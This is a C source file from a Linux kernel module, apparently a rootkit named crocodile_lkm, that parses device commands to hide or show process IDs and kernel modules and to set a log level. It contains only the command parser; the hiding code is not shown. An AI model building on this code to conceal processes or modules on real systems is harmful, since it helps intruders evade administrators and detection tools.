/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/string.h>

#include "logging.h"
#include "ctrl/ioctl.h"
#include "ctrl/details/parser_str_cmd.h"

static int _check_cmd(char** p_cmd_str, size_t count)
{
    const int MAX_BUF_SIZE = 255;

    if ((count > MAX_BUF_SIZE - 1) || (count < 13)) {
        KLOG_DEBUG(LOG_PREFIX "device::_check_cmd: invalid buffer size %ld", count);
        return -EFAULT;
    }
    if (((*p_cmd_str)[3] != '_') || ((*p_cmd_str)[7] != '_')) {
        KLOG_DEBUG(LOG_PREFIX "device::_check_cmd: invalid buffer format");
        return -EFAULT;
    }
    (*p_cmd_str)[3] = (*p_cmd_str)[7] = 0;
    if ((*p_cmd_str)[count - 1] == '\n') {
        (*p_cmd_str)[count - 1] = 0;
    }
    return 0;
}

static int _check_cmd_header(char** p_cmd_str)
{
    if (strcmp(*p_cmd_str, "IOC") != 0) {
        KLOG_DEBUG(LOG_PREFIX "device::_check_cmd_header: invalid header");
        return -EFAULT;
    }
    *p_cmd_str += 4;
    return 0;
}

static int _fill_cmd(char** p_cmd_str, unsigned int* p_cmd)
{
    if (strcmp(*p_cmd_str, "PID") == 0) {
        KLOG_DEBUG(LOG_PREFIX "device::_fill_cmd: processing pid");
        (*p_cmd_str)[8] = 0;
        *p_cmd = CROC_IOC_PID;
    } else if (strcmp(*p_cmd_str, "MOD") == 0) {
        KLOG_DEBUG(LOG_PREFIX "device::_fill_cmd: processing module");
        (*p_cmd_str)[8] = 0;
        *p_cmd = CROC_IOC_MOD;
    } else if (strcmp(*p_cmd_str, "LOG") == 0) {
        KLOG_DEBUG(LOG_PREFIX "device::_fill_cmd: processing log level");
        *p_cmd = CROC_IOC_LOG;
    } else {
        return -EFAULT;
    }

    *p_cmd_str += 4;
    if ((*p_cmd & CROC_IOC_PID) || (*p_cmd & CROC_IOC_MOD)) {
        if (strcmp(*p_cmd_str, "HIDE") == 0) {
            KLOG_DEBUG(LOG_PREFIX "device::_fill_cmd: hide pid");
            *p_cmd = *p_cmd | CROC_IOC_HIDE_CMD;
        } else if (strcmp(*p_cmd_str, "SHOW") == 0) {
            KLOG_DEBUG(LOG_PREFIX "device::_fill_cmd: show pid");
            *p_cmd = *p_cmd | CROC_IOC_SHOW_CMD;
        } else {
            return -EFAULT;
        }
    }
    if (*p_cmd & CROC_IOC_PID) {
        *p_cmd_str += 5;
    }
    return 0;
}

static int _fill_cmd_arg(char** p_cmd_str, unsigned int* p_cmd, unsigned long* p_arg)
{
    int rc = -EFAULT;

    if ((*p_cmd & CROC_IOC_PID) || (*p_cmd & CROC_IOC_MOD)) {
        rc = kstrtoul(*p_cmd_str, 10, p_arg);
    } else if (*p_cmd & CROC_IOC_LOG){
        if (strcmp(*p_cmd_str, "EMERG") == 0) {
            *p_arg = LVL_EMERG;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "FATAL") == 0) {
            *p_arg = LVL_FATAL;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "CRIT") == 0) {
            *p_arg = LVL_CRIT;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "ERROR") == 0) {
            *p_arg = LVL_ERROR;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "WARN") == 0) {
            *p_arg = LVL_WARN;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "NOTICE") == 0) {
            *p_arg = LVL_NOTICE;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "INFO") == 0) {
            *p_arg = LVL_INFO;
            rc = 0;
        } else if (strcmp(*p_cmd_str, "DEBUG") == 0) {
            *p_arg = LVL_DEBUG;
            rc = 0;
        }
    }
    KLOG_DEBUG(LOG_PREFIX "device::_fill_cmd_arg: return code %d", rc);
    return rc;
}

int parse_str_cmd(char* p_cmd_str, size_t count, unsigned int* p_cmd, unsigned long* p_arg)
{
    int rc = 0;

    if ((p_cmd_str == NULL) || (p_cmd == NULL) || (p_arg == NULL)) {
        KLOG_DEBUG(LOG_PREFIX "device::ioc_parse_cmd: invalid input params");
        return -EFAULT;
    }

    rc = _check_cmd(&p_cmd_str, count);
    if (rc != 0) {
        KLOG_DEBUG(LOG_PREFIX "device::ioc_parse_cmd: failed to check command; reason: %d", rc);
        return rc;
    }
    rc = _check_cmd_header(&p_cmd_str);
    if (rc != 0) {
        KLOG_DEBUG(LOG_PREFIX "device::ioc_parse_cmd: invalid header; reason: %d", rc);
        return rc;
    }

    rc = _fill_cmd(&p_cmd_str, p_cmd);
    if (rc != 0) {
        KLOG_DEBUG(LOG_PREFIX "device::ioc_parse_cmd: invalid mode; reason: %d", rc);
        return rc;
    }

    rc = _fill_cmd_arg(&p_cmd_str, p_cmd, p_arg);
    return rc;
}

